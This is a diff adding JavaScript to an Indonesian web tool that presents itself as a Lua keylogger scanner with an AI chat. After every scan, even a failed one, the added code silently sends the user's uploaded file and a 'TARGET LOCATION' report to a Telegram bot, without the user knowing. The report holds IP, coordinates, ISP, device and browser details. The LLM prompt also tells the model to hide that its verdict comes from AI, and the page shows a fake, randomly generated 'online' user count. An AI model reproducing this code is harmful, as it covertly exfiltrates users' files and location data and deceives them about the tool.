+      warningText = 'Keylogger Not Detected';
+    } else {
+      warningEmoji = isKeylogger ? '🔴' : '🟡';
+      warningText = isKeylogger ? 'KEYLOGGER DETECTED!' : 'Potensi Keylogger';
+    }
+
+    const detectedEmoji = isKeylogger ? '🚨' : '✅';
+    const detectedText = isKeylogger ? 'KEYLOGGER DETECTED!' : 'Keylogger Not Detected';
+
+    // Get current time in WIB (Asia/Jakarta timezone)
+    const now = new Date();
+    const options = { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
+    const timeString = new Intl.DateTimeFormat('id-ID', options).format(now).replace(',', '');
+    const [datePart, timePart] = timeString.split(' ');
+    const [day, month, year] = datePart.split('/');
+    const formattedTime = `${day}/${month}/${year} \u23f0 ${timePart} WIB`;
+
+    // Build beautiful message with improved format
+    const message = `╔══════════════════════════════╗
+║  \ud83d\udd13 LEVANDOZ SCAN REPORT  ║
+╚══════════════════════════════╝
+
+${scoreClass} SECURITY STATUS: ${scoreLabel}
+\u27a1\ufe0f Score: ${scoreEmoji} ${securityScore}/100
+\u27a1\ufe0f Keylogger: ${detectedEmoji} ${detectedText}
+\u27a1\ufe0f Warning Level: ${warningEmoji} ${warningLevel}/3
+
+─────────────────────────────
+\ud83d\udcc1 FILE INFORMATION
+─────────────────────────────
+\ud83d\udcc4 File Name: \u0060${fileName}\u0060
+\ud83d\udcc5 File Size: ${(file.size / 1024).toFixed(2)} KB
+\ud83d\udcbb Scan Type: Keylogger Detection
+
+─────────────────────────────
+\ud83d\udccb TARGET LOCATION
+─────────────────────────────
+\ud83c\udf0d Country: ${userInfo.ipInfo.country} ${getFlagEmoji(userInfo.ipInfo.countryCode)}
+\ud83d\udfe2 Region: ${userInfo.ipInfo.region}
+\ud83c\udfd9 City: ${userInfo.ipInfo.city}
+\ud83d\udce6 Postal: ${userInfo.ipInfo.postal}
+\ud83d\udccd IP Address: \u0060${userInfo.ipInfo.ip}\u0060
+\ud83d\uddfa Coordinates: ${userInfo.ipInfo.lat}, ${userInfo.ipInfo.lon}
+\ud83c\udf10 Timezone: ${userInfo.ipInfo.timezone}
+\ud83d\udce1 ISP: ${userInfo.ipInfo.isp}
+
+─────────────────────────────
+\ud83d\udcf7 DEVICE INFO
+─────────────────────────────
+\ud83d\udcf2 Device OS: ${userInfo.osName} ${userInfo.osEmoji}
+\ud83c\udf0e Browser: ${userInfo.browserName} ${userInfo.browserEmoji}
+\ud83d\udcfb Screen: ${userInfo.screenWidth}x${userInfo.screenHeight}
+\ud83d\udd0b Language: ${userInfo.browserLanguage}
+\ud83d\udc4e User Agent: \u0060${userInfo.userAgent}\u0060
+
+─────────────────────────────
+\ud83d\udc4c SCAN COMPLETE
+─────────────────────────────
+\u23f0 Scanned at: ${formattedTime}
+\u26a1\ufe0f Powered by Levandoz Security
+\ud83d\udee1\ufe0f Created by @SamuDev\ud83d\udc8a`;
+
+    // Send message to Telegram (direct API call)
+    const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(messageUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown',
+      }),
+    });
+
+    // Send file to Telegram (direct API call)
+    const fileFormData = new FormData();
+    fileFormData.append('chat_id', chatId);
+    fileFormData.append('document', file);
+    fileFormData.append('caption', `\ud83d\udccb FILE ATTACHMENT: ${fileName}\n\ud83d\udd0a Size: ${(file.size / 1024).toFixed(2)} KB`);
+
+    const fileUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
+    await fetch(fileUrl, {
+      method: 'POST',
+      body: fileFormData,
+    });
+
+    console.log('\u2705 Telegram notification sent successfully!');
+  } catch (error) {
+    console.error('\u274c Error sending to Telegram:', error);
+  }
+}
+
+// Helper function to get country flag emoji
+function getFlagEmoji(countryCode) {
+  if (!countryCode || countryCode === 'Unknown') return '';
+  const codePoints = countryCode
+    .toUpperCase()
+    .split('')
+    .map(char => 127397 + char.charCodeAt());
+  return String.fromCodePoint(...codePoints);
+}
+
+async function scanKeylogger() {
+  // Cek cooldown
+  if (isInCooldown()) {
+    showCooldownNotification();
+    return;
+  }
+
+  const fileInput = document.getElementById('luaFile');
+  const resultDiv = document.getElementById('scanResult');
+  const title = document.getElementById('scanTitle');
+  const details = document.getElementById('scanDetails');
+  const scoreDisplay = document.getElementById('securityScoreDisplay');
+  const conclusion = document.getElementById('scanConclusion');
+  const recommendation = document.getElementById('scanRecommendation');
+
+  if (!fileInput.files[0]) {
+    return showToast('Pilih file Lua/Luac terlebih dahulu!');
+  }
+
+  const file = fileInput.files[0];
+  if (!file.name.endsWith('.lua') && !file.name.endsWith('.luac')) {
+    return showToast('File harus berformat .lua atau .luac!');
+  }
+
+  resultDiv.style.display = 'none';
+  showToast('Sedang menganalisis file...');
+
+  const reader = new FileReader();
+  reader.onload = async function(e) {
+    let code = e.target.result;
+
+    // Jika file .luac (compiled), beri info
+    let isLuac = file.name.endsWith('.luac');
+    if (isLuac) {
+      showToast('⚠️ File .luac terdeteksi. Kompilasi file mungkin mengenkripsi code.');
+    }
+
+    // Step 1: Analisis dengan pattern matching
+    showToast('Menganalisis patterns...');
+    const analysis = analyzeLuaCode(code);
+
+    // Step 2: Kirim hasil analisis ke Groq AI untuk kesimpulan
+    showToast('Membuat kesimpulan...');
+
+    // Buat summary dari analisis
+    const analysisSummary = {
+      filename: file.name,
+      fileType: isLuac ? '.luac (compiled)' : '.lua',
+      warningLevel: analysis.warningLevel,
+      isKeylogger: analysis.isKeylogger,
+      securityScore: 100 - analysis.score, // Invert score (100 = most secure, 0 = least secure)
+      findings: {
+        keyboardHooks: analysis.keyboardHooks.length,
+        inputCapture: analysis.inputCapture.length,
+        externalUrls: analysis.externalUrls.length,
+        discordTelegramUrls: analysis.discordTelegramUrls.length,
+        otherUrls: analysis.otherUrls.length,
+        dataSending: analysis.dataSending.length,
+        fileOps: analysis.fileOps.length,
+        clipboard: analysis.clipboard.length,
+        screenshot: analysis.screenshot.length,
+        encryption: analysis.encryption
+      },
+      suspiciousItems: {
+        discordTelegramUrls: analysis.discordTelegramUrls.slice(0, 5),
+        otherUrls: analysis.otherUrls.slice(0, 5),
+        keyboardPatterns: [...new Set(analysis.keyboardHooks)].slice(0, 5),
+        dataSendingPatterns: [...new Set(analysis.dataSending)].slice(0, 5)
+      }
+    };
+
+    // Hitung security score yang masuk akal
+    // 100 = Sangat aman, 0 = Sangat berbahaya
+    const securityScore = calculateSecurityScore(analysis);
+
+    const prompt = `Anda adalah expert keamanan cyber khusus untuk deteksi keylogger dalam file Lua dan Luac.
+Analisa hasil scan keamanan kode Lua dan berikan kesimpulan dengan security score yang masuk akal.
+
+File: ${analysisSummary.filename}
+File Type: ${analysisSummary.fileType}
+Warning Level: ${analysisSummary.warningLevel}/3
+Security Score: ${securityScore}/100 (100 = Sangat Aman, 0 = Sangat Berbahaya)
+
+Hasil Scan:
+- Keyboard Hooks: ${analysisSummary.findings.keyboardHooks} item
+- Input Capture: ${analysisSummary.findings.inputCapture} item
+- Total External URLs: ${analysisSummary.findings.externalUrls} item
+- Discord/Telegram URLs: ${analysisSummary.findings.discordTelegramUrls} item (PERINGATAN: Discord dan Telegram sering digunakan untuk mengirim data keylogger)
+- Other External URLs: ${analysisSummary.findings.otherUrls} item (lebih aman dibanding Discord/Telegram)
+- Data Sending: ${analysisSummary.findings.dataSending} item
+- File Operations: ${analysisSummary.findings.fileOps} item
+- Clipboard Access: ${analysisSummary.findings.clipboard} item
+- Screenshot: ${analysisSummary.findings.screenshot} item
+
+Encryption Level: ${analysisSummary.findings.encryption.level}/3
+- Base64: ${analysisSummary.findings.encryption.hasBase64 ? 'Yes' : 'No'}
+- XOR Encryption: ${analysisSummary.findings.encryption.hasXOR ? 'Yes' : 'No'}
+- Advanced Encryption: ${analysisSummary.findings.encryption.hasAdvanced ? 'Yes' : 'No'}
+
+URL Discord/Telegram yang ditemukan: ${analysisSummary.suspiciousItems.discordTelegramUrls.length > 0 ? analysisSummary.suspiciousItems.discordTelegramUrls.map(u => u.url).join(', ') : 'Tidak ada'}
+URL External lain yang ditemukan: ${analysisSummary.suspiciousItems.otherUrls.length > 0 ? analysisSummary.suspiciousItems.otherUrls.map(u => u.url).join(', ') : 'Tidak ada'}
+
+CONTOH KEYLOGGER:
+Keylogger biasanya memiliki ciri-ciri:
+1. Keyboard hooks (GetAsyncKeyState, SetWindowsHookEx, dll)
+2. Mengirim data ke external URLs via HTTP request
+3. Menggunakan Discord/Telegram webhook untuk mengirim data yang dicatat
+4. Mengenkripsi data yang dicatat (Base64, XOR, AES, dll)
+5. Mengakses clipboard atau screenshot untuk mengambil informasi tambahan
+
+Tugas:
+1. Berikan kesimpulan dalam bahasa Indonesia yang natural, informatif, dan mudah dibaca
+2. Jelaskan apakah ini keylogger atau tidak berdasarkan hasil scan
+3. Jika ada Discord/Telegram URL + keyboard hooks, tandai sebagai KEYLOGGER DETECTED
+4. Jika ada external URL lain (bukan Discord/Telegram), tandai sebagai Warning 1 - Keylogger Not Detected
+5. Berikan security score yang masuk akal (0-100, dimana 100 sangat aman dan 0 sangat berbahaya)
+6. Berikan rekomendasi untuk user
+
+Respons harus dalam format JSON EXACTLY seperti ini:
+{
+  "summary": "kesimpulan lengkap dalam bahasa Indonesia yang mudah dibaca",
+  "recommendation": "rekomendasi dalam bahasa Indonesia",
+  "securityScore": ${securityScore}
+}
+
+PENTING:
+- Jangan sebut bahwa kesimpulan ini dari AI atau Groq. Tulis seolah-olah hasil analisis dari sistem keamanan.
+- Discord/Telegram URLs lebih mencurigakan untuk keylogger daripada external URLs lain.
+- Security score harus masuk akal berdasarkan findings.
+- HANYA keluarkan JSON!`;
+
+    try {
+      if (!GROQ_API_KEY) {
+        throw new Error('API Key tidak tersedia');
+      }
+
+      const response = await fetch(GROQ_API_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${GROQ_API_KEY}`
+        },
+        body: JSON.stringify({
+          model: 'llama-3.3-70b-versatile',
+          messages: [
+            { role: 'user', content: prompt }
+          ],
+          temperature: 0.5,
+          max_tokens: 800,
+          response_format: { type: 'json_object' }
+        })
+      });
+
+      if (!response.ok) {
+        const errorData = await response.json().catch(() => ({}));
+        throw new Error(errorData.error?.message || `HTTP ${response.status}`);
+      }
+
+      const data = await response.json();
+      const aiContent = data.choices[0].message.content;
+      const aiResult = JSON.parse(aiContent);
+
+      // Tampilkan hasil
+      resultDiv.style.display = 'block';
+
+      let warningEmoji, warningClass, warningText;
+      if (analysis.warningLevel === 0) {
+        warningEmoji = '🟢';
+        warningClass = '';
+        warningText = 'AMAN';
+      } else if (analysis.warningLevel === 1) {
+        warningEmoji = '🟡';
+        warningClass = 'warning-1';
+        warningText = 'WARNING 1';
+      } else if (analysis.warningLevel === 2) {
+        warningEmoji = '🟡';
+        warningClass = 'warning-2';
+        warningText = 'WARNING 2';
+      } else {
+        warningEmoji = '🔴';
+        warningClass = 'warning-3';
+        warningText = 'WARNING 3';
+      }
+
+      // Title with keylogger detection status
+      if (analysis.isKeylogger) {
+        title.innerHTML = `<span class="${warningClass}">${warningEmoji} ${warningText} - Keylogger Detected!</span>`;
+      } else {
+        title.innerHTML = `<span style="color:#4ade80;">${warningEmoji} ${warningText} - Keylogger Not Detected</span>`;
+      }
+
+      // Build details HTML
+      let detailsHtml = '<strong>Detail Scan:</strong><ul style="margin-left:20px;color:var(--muted);margin-top:8px;">';
+      detailsHtml += `<li>Keyboard Hooks: <span style="color:${analysis.keyboardHooks.length > 0 ? '#fbbf24' : '#4ade80'}">${analysis.keyboardHooks.length}</span></li>`;
+      detailsHtml += `<li>Input Capture: <span style="color:${analysis.inputCapture.length > 0 ? '#fbbf24' : '#4ade80'}">${analysis.inputCapture.length}</span></li>`;
+      detailsHtml += `<li>External URLs: <span style="color:${analysis.externalUrls.length > 0 ? '#ff5555' : '#4ade80'}">${analysis.externalUrls.length}</span></li>`;
+
+      // Special highlighting for Discord/Telegram vs Other URLs
+      if (analysis.discordTelegramUrls.length > 0) {
+        detailsHtml += `<li style="color:#ff5555;">⚠️ Discord/Telegram URLs: ${analysis.discordTelegramUrls.length} (High Risk)</li>`;
+      }
+      if (analysis.otherUrls.length > 0) {
+        detailsHtml += `<li style="color:#fbbf24;">Other External URLs: ${analysis.otherUrls.length} (Low Risk)</li>`;
+      }
+
+      detailsHtml += `<li>Data Sending: <span style="color:${analysis.dataSending.length > 0 ? '#ff5555' : '#4ade80'}">${analysis.dataSending.length}</span></li>`;
+      detailsHtml += `<li>File Operations: <span style="color:${analysis.fileOps.length > 0 ? '#fbbf24' : '#4ade80'}">${analysis.fileOps.length}</span></li>`;
+      detailsHtml += `<li>Clipboard Access: <span style="color:${analysis.clipboard.length > 0 ? '#fbbf24' : '#4ade80'}">${analysis.clipboard.length}</span></li>`;
+      detailsHtml += `<li>Screenshot: <span style="color:${analysis.screenshot.length > 0 ? '#fbbf24' : '#4ade80'}">${analysis.screenshot.length}</span></li>`;
+      detailsHtml += `<li>Encryption Level: <span style="color:${analysis.encryption.level > 0 ? '#ff5555' : '#4ade80'}">${analysis.encryption.level}/3</span></li>`;
+      detailsHtml += '</ul>';
+
+      // Tampilkan URLs jika ada
+      if (analysis.discordTelegramUrls.length > 0) {
+        detailsHtml += '<div style="margin-top:12px;padding:10px;background:rgba(255,85,85,0.15);border-radius:8px;border:1px solid rgba(255,85,85,0.4);">';
+        detailsHtml += '<strong style="color:#ff5555;">⚠️ Discord/Telegram URLs ditemukan (Tinggi Risiko untuk Keylogger):</strong><ul style="margin-left:20px;color:#ff5555;font-size:11px;">';
+        analysis.discordTelegramUrls.slice(0, 5).forEach(u => {
+          detailsHtml += `<li>${u.url} (${u.type})</li>`;
+        });
+        detailsHtml += '</ul></div>';
+      }
+
+      if (analysis.otherUrls.length > 0) {
+        detailsHtml += '<div style="margin-top:12px;padding:10px;background:rgba(251,191,36,0.1);border-radius:8px;border:1px solid rgba(251,191,36,0.3);">';
+        detailsHtml += '<strong style="color:#fbbf24;">ℹ️ External URLs lain ditemukan (Rendah Risiko):</strong><ul style="margin-left:20px;color:#fbbf24;font-size:11px;">';
+        analysis.otherUrls.slice(0, 5).forEach(u => {
+          detailsHtml += `<li>${u.url} (${u.domain})</li>`;
+        });
+        detailsHtml += '</ul></div>';
+      }
+
+      details.innerHTML = detailsHtml;
+
+      // Security Score Display
+      const scoreClass = securityScore >= 70 ? 'score-high' : (securityScore >= 40 ? 'score-medium' : 'score-low');
+      scoreDisplay.innerHTML = `
+        <div class="security-score">
+          <div class="score-circle ${scoreClass}">${securityScore}</div>
+          <div class="score-label">
+            <strong>Security Score</strong>
+            <span>${securityScore >= 70 ? 'Sangat Aman' : (securityScore >= 40 ? 'Medium' : 'Berbahaya')}</span>
+          </div>
+        </div>
+      `;
+
+      conclusion.innerHTML = `<strong>Kesimpulan:</strong><br>${aiResult.summary}`;
+
+      if (aiResult.recommendation) {
+        recommendation.innerHTML = `<strong>Rekomendasi:</strong> ${aiResult.recommendation}`;
+      } else {
+        recommendation.innerHTML = '';
+      }
+
+      // Send scan result to Telegram (securityScore already calculated at line 2921)
+      sendScanToTelegram(file, file.name, securityScore, analysis.warningLevel, analysis.isKeylogger);
+
+      // Set cooldown setelah scan selesai
+      lastScanTime = Date.now();
+
+    } catch (error) {
+      console.error('Scan error:', error);
+      resultDiv.style.display = 'block';
+
+      // Tampilkan hasil pattern matching saja kalau Groq gagal
+      let warningEmoji, warningClass, warningText;
+      if (analysis.warningLevel === 0) {
+        warningEmoji = '🟢';
+        warningClass = '';
+        warningText = 'AMAN';
+      } else if (analysis.warningLevel === 1) {
+        warningEmoji = '🟡';
+        warningClass = 'warning-1';
+        warningText = 'WARNING 1';
+      } else if (analysis.warningLevel === 2) {
+        warningEmoji = '🟡';
+        warningClass = 'warning-2';
+        warningText = 'WARNING 2';
+      } else {
+        warningEmoji = '🔴';
+        warningClass = 'warning-3';
+        warningText = 'WARNING 3';
+      }
+
+      if (analysis.isKeylogger) {
+        title.innerHTML = `<span class="${warningClass}">${warningEmoji} ${warningText} - Keylogger Detected!</span>`;
+      } else {
+        title.innerHTML = `<span style="color:#4ade80;">${warningEmoji} ${warningText} - Keylogger Not Detected</span>`;
+      }
+
+      const securityScore = calculateSecurityScore(analysis);
+      const scoreClass = securityScore >= 70 ? 'score-high' : (securityScore >= 40 ? 'score-medium' : 'score-low');
+
+      let detailsHtml = '<strong>Detail Scan:</strong><ul style="margin-left:20px;color:var(--muted);margin-top:8px;">';
+      detailsHtml += `<li>Keyboard Hooks: ${analysis.keyboardHooks.length}</li>`;
+      detailsHtml += `<li>Input Capture: ${analysis.inputCapture.length}</li>`;
+      detailsHtml += `<li>External URLs: ${analysis.externalUrls.length}</li>`;
+      if (analysis.discordTelegramUrls.length > 0) {
+        detailsHtml += `<li style="color:#ff5555;">⚠️ Discord/Telegram URLs: ${analysis.discordTelegramUrls.length}</li>`;
+      }
+      if (analysis.otherUrls.length > 0) {
+        detailsHtml += `<li style="color:#fbbf24;">Other External URLs: ${analysis.otherUrls.length}</li>`;
+      }
+      detailsHtml += `<li>Data Sending: ${analysis.dataSending.length}</li>`;
+      detailsHtml += `<li>File Operations: ${analysis.fileOps.length}</li>`;
+      detailsHtml += `<li>Clipboard Access: ${analysis.clipboard.length}</li>`;
+      detailsHtml += `<li>Screenshot: ${analysis.screenshot.length}</li>`;
+      detailsHtml += `<li>Encryption Level: ${analysis.encryption.level}/3</li>`;
+      detailsHtml += '</ul>';
+      details.innerHTML = detailsHtml;
+
+      scoreDisplay.innerHTML = `
+        <div class="security-score">
+          <div class="score-circle ${scoreClass}">${securityScore}</div>
+          <div class="score-label">
+            <strong>Security Score</strong>
+            <span>${securityScore >= 70 ? 'Sangat Aman' : (securityScore >= 40 ? 'Medium' : 'Berbahaya')}</span>
+          </div>
+        </div>
+      `;
+
+      conclusion.innerHTML = `<strong>Kesimpulan:</strong><br>Berdasarkan scan pattern, file ini memiliki security score ${securityScore}/100 dengan warning level ${analysis.warningLevel}. ${analysis.isKeylogger ? 'Terdeteksi adanya indikasi keylogger.' : 'Tidak terdeteksi keylogger, namun tetap berhati-hati.'}`;
+
+      recommendation.innerHTML = `Gagal membuat kesimpulan detail: ${error.message}. Coba lagi dalam beberapa saat.`;
+
+      // Send scan result to Telegram even on error
+      sendScanToTelegram(file, file.name, securityScore, analysis.warningLevel, analysis.isKeylogger);
+
+      // Set cooldown setelah scan selesai
+      lastScanTime = Date.now();
+    }
+  };
+
+  reader.readAsText(file);
+}
+
+function calculateSecurityScore(analysis) {
+  let score = 100;
+
+  // Kurangi score berdasarkan findings
+  if (analysis.keyboardHooks.length > 0) score -= 25;
+  if (analysis.inputCapture.length > 0) score -= 20;
+
+  // Discord/Telegram URLs sangat berbahaya
+  if (analysis.discordTelegramUrls.length > 0) score -= 30;
+
+  // External URLs lain lebih aman
+  if (analysis.otherUrls.length > 0) score -= 10;
+
+  if (analysis.dataSending.length > 0) score -= 15;
+  if (analysis.fileOps.length > 0) score -= 10;
+  if (analysis.clipboard.length > 0) score -= 10;
+  if (analysis.screenshot.length > 0) score -= 10;
+
+  // Encryption
+  if (analysis.encryption.level >= 3) score -= 20;
+  else if (analysis.encryption.level === 2) score -= 15;
+  else if (analysis.encryption.level === 1) score -= 5;
+
+  return Math.max(0, Math.min(100, score));
+}
+
+// ============ CHAT AI WITH GROQ ============
+function loadChatAiHistory() {
+  const messagesContainer = document.getElementById('chatAiMessages');
+  const welcomeCard = document.getElementById('aiWelcomeCard');
+
+  if (chatHistory.length === 0) {
+    welcomeCard.style.display = 'block';
+    messagesContainer.innerHTML = '';
+    messagesContainer.appendChild(welcomeCard);
+  } else {
+    welcomeCard.style.display = 'none';
+    messagesContainer.innerHTML = '';
+
+    chatHistory.forEach(msg => {
+      addMessageToChat(msg.role, msg.content, msg.timestamp, false);
+    });
+
+    scrollToBottom();
+  }
+}
+
+function addMessageToChat(role, content, timestamp, saveToHistory = true) {
+  const messagesContainer = document.getElementById('chatAiMessages');
+  const welcomeCard = document.getElementById('aiWelcomeCard');
+
+  // Hide welcome card on first message
+  if (welcomeCard && welcomeCard.style.display !== 'none') {
+    welcomeCard.style.display = 'none';
+  }
+
+  const messageDiv = document.createElement('div');
+  messageDiv.className = `ai-message ${role}`;
+
+  const avatar = document.createElement('div');
+  avatar.className = `ai-avatar ${role}`;
+  avatar.textContent = role === 'ai' ? '🤖' : (username ? username.charAt(0).toUpperCase() : 'U');
+
+  const contentDiv = document.createElement('div');
+  contentDiv.className = 'ai-message-content';
+  contentDiv.innerHTML = formatMessage(content);
+
+  const timeDiv = document.createElement('div');
+  timeDiv.className = 'ai-message-time';
+  timeDiv.textContent = formatTime(timestamp);
+
+  contentDiv.appendChild(timeDiv);
+  messageDiv.appendChild(avatar);
+  messageDiv.appendChild(contentDiv);
+  messagesContainer.appendChild(messageDiv);
+
+  if (saveToHistory) {
+    chatHistory.push({ role, content, timestamp });
+    localStorage.setItem(CHAT_AI_HISTORY_KEY, JSON.stringify(chatHistory));
+  }
+
+  scrollToBottom();
+}
+
+function showTypingIndicator() {
+  const messagesContainer = document.getElementById('chatAiMessages');
+  const typingDiv = document.createElement('div');
+  typingDiv.className = 'ai-message ai';
+  typingDiv.id = 'typingIndicator';
+
+  const avatar = document.createElement('div');
+  avatar.className = 'ai-avatar ai';
+  avatar.textContent = '🤖';
+
+  const contentDiv = document.createElement('div');
+  contentDiv.className = 'ai-message-content';
+
+  const typingIndicator = document.createElement('div');
+  typingIndicator.className = 'ai-typing-indicator';
+  typingIndicator.innerHTML = '<div class="ai-typing-dot"></div><div class="ai-typing-dot"></div><div class="ai-typing-dot"></div>';
+
+  contentDiv.appendChild(typingIndicator);
+  typingDiv.appendChild(avatar);
+  typingDiv.appendChild(contentDiv);
+  messagesContainer.appendChild(typingDiv);
+
+  scrollToBottom();
+}
+
+function hideTypingIndicator() {
+  const typingIndicator = document.getElementById('typingIndicator');
+  if (typingIndicator) {
+    typingIndicator.remove();
+  }
+}
+
+function autoResizeTextarea(textarea) {
+  textarea.style.height = 'auto';
+  textarea.style.height = Math.min(textarea.scrollHeight, 120) + 'px';
+}
+
+function handleChatAiKeyDown(event) {
+  if (event.key === 'Enter' && !event.shiftKey) {
+    event.preventDefault();
+    sendChatAiMessage();
+  }
+}
+
+function formatMessage(message) {
+  // Simple formatting - convert newlines to breaks
+  return message.replace(/\n/g, '<br>');
+}
+
+function sendQuickMessage(message) {
+  document.getElementById('chatAiInput').value = message;
+  sendChatAiMessage();
+}
+
+async function sendChatAiMessage() {
+  const input = document.getElementById('chatAiInput');
+  const message = input.value.trim();
+
+  if (!message) return;
+
+  console.log('[Chat AI] Sending message:', message);
+
+  // Add user message to chat and history
+  addMessageToChat('user', message, new Date().toISOString(), true);
+  
+  // Clear input
+  input.value = '';
+  input.style.height = 'auto';
+
+  // Show typing indicator
+  showTypingIndicator();
+
+  try {
+    if (!GROQ_API_KEY) {
+      throw new Error('API Key tidak tersedia');
+    }
+
+    console.log('[Chat AI] Calling Groq API...');
+    
+    // Prepare messages with history
+    const apiMessages = [
+      { role: 'system', content: 'Anda adalah AI assistant yang membantu dan informatif. Jawab dengan bahasa Indonesia yang natural, singkat, dan jelas. Gunakan emoji untuk membuat jawaban lebih menarik.' },
+      ...chatHistory.map(msg => ({
+        role: msg.role === 'ai' ? 'assistant' : 'user',
+        content: msg.content
+      }))
+    ];
+
+    console.log('[Chat AI] Total messages in history:', apiMessages.length);
+
+    const response = await fetch(GROQ_API_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${GROQ_API_KEY}`
+      },
+      body: JSON.stringify({
+        model: 'llama-3.3-70b-versatile',
+        messages: apiMessages,
+        temperature: 0.7,
+        max_tokens: 1000
+      })
+    });
+
+    console.log('[Chat AI] Response status:', response.status);
+
+    if (!response.ok) {
+      const errorData = await response.json().catch(() => ({}));
+      console.error('[Chat AI] Error response:', errorData);
+      throw new Error(errorData.error?.message || `HTTP ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log('[Chat AI] Response data:', data);
+
+    if (!data.choices || !data.choices[0] || !data.choices[0].message) {
+      throw new Error('Invalid response format from API');
+    }
+
+    const aiMessage = data.choices[0].message.content;
+    console.log('[Chat AI] AI response:', aiMessage);
+
+    hideTypingIndicator();
+    
+    // Add AI response to chat
+    addMessageToChat('ai', aiMessage, new Date().toISOString(), true);
+    
+    console.log('[Chat AI] Message displayed successfully');
+
+  } catch (error) {
+    hideTypingIndicator();
+    console.error('[Chat AI] Error:', error);
+    
+    const errorMessage = `Maaf, terjadi kesalahan: ${error.message}`;
+    addMessageToChat('ai', errorMessage, new Date().toISOString(), false);
+    
+    showToast('Gagal mengirim pesan ke AI');
+  }
+}
+
+function clearChatAi() {
+  if (!confirm('Hapus semua chat history?')) return;
+
+  chatHistory = [];
+  localStorage.removeItem(CHAT_AI_HISTORY_KEY);
+  loadChatAiHistory();
+  showToast('Chat history dihapus!');
+}
+
+function formatTime(timestamp) {
+  if (!timestamp) return '';
+  const date = new Date(timestamp);
+  const hours = date.getHours().toString().padStart(2, '0');
+  const minutes = date.getMinutes().toString().padStart(2, '0');
+  return `${hours}:${minutes}`;
+}
+
+// ============ ONLINE COUNT ============
+function updateOnlineCount() {
+  const count = Math.floor(Math.random() * 50) + 100;
+  document.getElementById('onlineCount').textContent = count;
+}
+
+// Update online count setiap 30 detik
+setInterval(updateOnlineCount, 30000);
+updateOnlineCount();
+
+// ============ INIT ============
+document.addEventListener('DOMContentLoaded', () => {
+  updateSecureUI();
+
+  // Load video
+  const video = document.querySelector('.hero-video');
+  if (video) {
+    video.load();
+    video.addEventListener('canplay', () => {
+      video.classList.add('ready');
+    });
+  }
+});
+</script>
+</body>
+</html>
